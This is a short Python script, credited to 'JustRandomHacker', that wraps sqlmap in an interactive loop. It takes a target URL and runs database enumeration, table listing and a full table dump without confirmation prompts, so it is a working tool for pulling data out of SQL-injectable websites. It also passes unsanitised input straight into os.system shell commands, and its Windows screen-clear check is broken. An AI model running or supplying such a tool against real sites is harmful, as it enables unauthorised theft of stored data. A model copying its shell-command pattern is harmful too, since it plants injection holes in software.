import os
from termcolor import colored  
import fade
from colorama import Fore, init, Style

def clear():
    if os.name == "posix":
        os.system ("clear")
    elif os.name == ("ce", "nt", "dos"):
        os.system ("cls")

banner = """	   
░██████╗███████╗░█████╗░██╗░░░██╗██████╗░██╗██████╗░░█████╗░████████╗
██╔════╝██╔════╝██╔══██╗██║░░░██║██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝
╚█████╗░█████╗░░██║░░╚═╝██║░░░██║██████╔╝██║██████╦╝██║░░██║░░░██║░░░
░╚═══██╗██╔══╝░░██║░░██╗██║░░░██║██╔══██╗██║██╔══██╗██║░░██║░░░██║░░░
██████╔╝███████╗╚█████╔╝╚██████╔╝██║░░██║██║██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░  
"""

clear()

print("")
faded_text = fade.purplepink(banner)
print(faded_text)

print(Fore.GREEN + " 	    	   Created by github/JustRandomHacker")
print("")
while True:
    print(colored("Enter the URL(GET) to scan: ", 'blue', attrs=['bold']))
    url = input()
    url = '"' + url + '"'  
    print(colored("We will display all available databases:", 'yellow', attrs=['bold']))
    os.system(f"sqlmap -u {url} --dbs --batch")

    print(colored("Enter the name of the database you want to use:", 'blue', attrs=['bold']))
    db_name = input()
    print(colored(f"Here are the tables in the {db_name} database:", 'yellow', attrs=['bold']))
    os.system(f"sqlmap -u {url} -D {db_name} --tables --batch")

    print(colored("Enter the name of the table you want to use:", 'blue', attrs=['bold']))
    table_name = input()
    print(colored(f"We will now extract data from the {table_name} table:", 'yellow', attrs=['bold']))
    os.system(f"sqlmap -u {url} -D {db_name} -T {table_name} --dump --batch")

    print(colored("Do you want to run another test? (y/n)", 'green', attrs=['bold']))
    answer = input()
    if answer.lower() != 'y':
        break
